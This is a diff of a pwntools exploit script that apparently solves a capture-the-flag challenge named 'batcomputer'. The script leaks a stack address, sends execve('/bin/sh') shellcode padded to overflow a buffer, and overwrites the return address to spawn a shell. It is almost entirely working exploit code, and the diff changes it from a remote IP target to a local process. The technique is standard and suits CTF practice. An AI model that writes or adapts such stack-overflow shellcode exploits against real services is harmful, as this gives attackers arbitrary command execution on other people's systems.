@@ -1,11 +1,11 @@
 from pwn import *
 
 context.arch = 'amd64'
-#context.log_level = 'debug'
+context.log_level = 'info'
 
-#io = process('./batcomputer')
-ip, port = '165.22.115.189', 32126
-io = remote(ip, port)
+io = process('./batcomputer')
+#ip, port = '165.22.115.189', 32126
+#io = remote(ip, port)
 
 io.sendlineafter('>', '1')
 addr = p64(int(io.recvline().split()[-1],16))
@@ -17,10 +17,11 @@ payload_size = 76+8
 
 #print shellcraft.sh()
 #shellcode = asm(shellcraft.linux.cat('flag.txt'))	#OK
-#shellcode = asm(shellcraft.amd64.sh(), arch='amd64')   #Failed...
+shellcode = asm(shellcraft.popad())
+shellcode += asm(shellcraft.sh())
 
 #http://shell-storm.org/shellcode/files/shellcode-806.html
-shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+#shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 payload = shellcode + 'A'*(payload_size - len(shellcode)) + addr
 
 io.sendlineafter('Enter the navigation commands:', payload)
